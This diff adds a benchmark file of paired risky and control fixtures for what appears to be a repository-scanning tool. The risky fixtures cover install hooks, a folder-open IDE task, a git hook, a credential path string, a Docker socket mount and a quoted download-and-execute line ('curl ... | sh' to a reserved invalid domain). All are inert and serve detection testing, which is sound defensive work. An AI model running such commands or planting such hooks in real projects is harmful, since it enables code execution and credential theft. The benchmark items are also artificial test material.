@@ -1,0 +1,112 @@
+{
+  "benchmark_version": "1.0.0",
+  "cases": [
+    {
+      "id": "lifecycle",
+      "title": "Install lifecycle script",
+      "expected_rules": ["PKG-001"],
+      "known_missing": [],
+      "risky": {
+        "package.json": "{\"private\": true, \"scripts\": {\"postinstall\": \"echo REPYY_INERT_LIFECYCLE\"}}"
+      },
+      "control": {
+        "package.json": "{\"private\": true, \"scripts\": {\"test\": \"echo REPYY_CONTROL\"}}"
+      },
+      "safety": "The only lifecycle command prints a marker; reproduction never invokes npm."
+    },
+    {
+      "id": "startup",
+      "title": "Startup configuration imports an inert marker file",
+      "expected_rules": ["IMPORT-001"],
+      "known_missing": ["IMPORT-001"],
+      "risky": {
+        "postcss.config.cjs": "require('./marker.cjs'); module.exports = {};\n",
+        "marker.cjs": "const marker = 'require(computedModule)';\n"
+      },
+      "control": {
+        "postcss.config.cjs": "module.exports = { plugins: {} };\n"
+      },
+      "safety": "The imported file only assigns a string. The finding demonstrates a textual dynamic-import indicator, not a resolved startup call graph.",
+      "known_missing_reason": "Expected indicator did not match the inert fixture in benchmark 1.0.0. Preserved as a visible coverage gap; no detection change in the trust roadmap."
+    },
+    {
+      "id": "disguised-asset",
+      "title": "Executable-looking text in an image filename",
+      "expected_rules": ["EXEC-001"],
+      "known_missing": [],
+      "risky": {
+        "banner.png": "const marker = 'eval(atob(payload))';\n"
+      },
+      "control": {
+        "banner.svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"10\" height=\"10\"><rect width=\"10\" height=\"10\"/></svg>\n"
+      },
+      "safety": "The fake image contains only a string assignment, no evaluation call."
+    },
+    {
+      "id": "folder-open",
+      "title": "IDE folder-open task",
+      "expected_rules": ["IDE-001"],
+      "known_missing": ["IDE-001"],
+      "risky": {
+        ".vscode/tasks.json": "{\"version\": \"2.0.0\", \"tasks\": [{\"label\": \"Inert fixture\", \"type\": \"process\", \"command\": \"REPYY_NONEXISTENT_INERT_MARKER\", \"runOptions\": {\"runOn\": \"folderOpen\"}}]}"
+      },
+      "control": {
+        ".vscode/tasks.json": "{\"version\": \"2.0.0\", \"tasks\": [{\"label\": \"Manual marker\", \"type\": \"process\", \"command\": \"REPYY_NONEXISTENT_INERT_MARKER\"}]}"
+      },
+      "safety": "Nonexistent marker command. Do not open materialized fixtures in a task-enabled IDE.",
+      "known_missing_reason": "Expected indicator did not match the inert fixture in benchmark 1.0.0. Preserved as a visible coverage gap; no detection change in the trust roadmap."
+    },
+    {
+      "id": "git-hook",
+      "title": "Git commit hook",
+      "expected_rules": ["GITHOOK-001"],
+      "known_missing": [],
+      "risky": {
+        ".git/hooks/pre-commit": "#!/bin/sh\n# Inert pre-commit fixture\nprintf \"%s\\n\" REPYY_INERT_HOOK\n"
+      },
+      "control": {
+        ".git/hooks/pre-commit.sample": "# Example only; inactive hook\n"
+      },
+      "safety": "Hook is non-executable and only prints a marker; reproduction never runs Git in the fixture."
+    },
+    {
+      "id": "obfuscated-download",
+      "title": "Encoded download-and-execute indicators",
+      "expected_rules": ["CHAIN-001"],
+      "known_missing": [],
+      "risky": {
+        "marker.js": "const marker = 'eval(atob(payload)); curl https://fixture.invalid/inert | sh';\n"
+      },
+      "control": {
+        "marker.js": "const label = 'A normal display label';\n"
+      },
+      "safety": "Reserved invalid domain and quoted inert text. No callable downloader or evaluator."
+    },
+    {
+      "id": "credential-path",
+      "title": "Credential path reference",
+      "expected_rules": ["CRED-001"],
+      "known_missing": [],
+      "risky": {
+        "marker.js": "const marker = '/REPYY_FAKE_HOME/.aws/credentials';\n"
+      },
+      "control": {
+        "marker.js": "const mode = process.env.NODE_ENV;\n"
+      },
+      "safety": "Only a fake path string. Neither example reads credential files; benign environment use may still receive a low-severity finding."
+    },
+    {
+      "id": "docker-socket",
+      "title": "Docker socket mount",
+      "expected_rules": ["DOCKER-001"],
+      "known_missing": [],
+      "risky": {
+        "compose.yaml": "services:\n  marker:\n    image: fixture.invalid/repyy-nonexistent:inert\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n"
+      },
+      "control": {
+        "compose.yaml": "services:\n  marker:\n    image: fixture.invalid/repyy-nonexistent:inert\n    volumes:\n      - ./data:/data:ro\n"
+      },
+      "safety": "Nonexistent image on a reserved invalid registry. Never start Compose; mount is configuration data only."
+    }
+  ]
+}
